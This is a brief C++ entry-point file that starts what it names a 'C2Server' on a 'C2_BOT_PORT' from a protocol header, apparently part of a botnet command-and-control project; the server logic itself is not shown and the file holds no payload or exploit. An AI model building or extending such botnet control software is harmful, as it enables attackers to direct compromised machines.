
#include "c2_server.hpp"
#include "protocol.hpp"
#include <iostream>

int main() {
    try {
        C2Server server(aether::C2_BOT_PORT); // Using port from protocol.hpp
        server.start();
    } catch (const std::exception& e) {
        std::cerr << "[C2] Fatal Error: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}
